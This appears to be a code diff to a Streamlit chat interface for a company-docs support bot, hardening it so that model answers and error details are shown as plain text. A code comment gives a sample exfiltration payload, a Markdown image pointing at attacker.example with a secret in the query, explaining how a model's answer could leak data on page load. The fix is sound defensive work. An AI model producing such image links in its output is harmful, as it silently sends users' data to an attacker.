@@ -10,6 +10,7 @@ from rag import EXPECTED_ERRORS, answer
 # Page text: change these to reword the UI.
 PAGE_TITLE = "Northwind Gadgets Support"
 PAGE_CAPTION = "Ask questions about Northwind's policies. Answers come from the company docs."
+ERROR_MESSAGE = "Couldn't answer this question."  # details are shown below it as plain text
 
 st.set_page_config(page_title=PAGE_TITLE)
 st.title(PAGE_TITLE)
@@ -24,12 +25,12 @@ def show(message: dict) -> None:
     """Draw one chat message."""
     with st.chat_message(message["role"]):
         if message.get("error"):
-            st.error(message["content"])
-        else:
-            # Plain text on purpose: Markdown would let a model answer like
-            # ![](https://attacker.example/?code=SECRET) make the browser load
-            # that URL automatically, leaking data without a click.
-            st.text(message["content"])
+            # st.error parses Markdown, so it only gets our own fixed text.
+            st.error(ERROR_MESSAGE)
+        # Plain text on purpose: Markdown would let a model answer like
+        # ![](https://attacker.example/?code=SECRET) make the browser load
+        # that URL automatically, leaking data without a click.
+        st.text(message["content"])
 
 
 def add(message: dict) -> None:
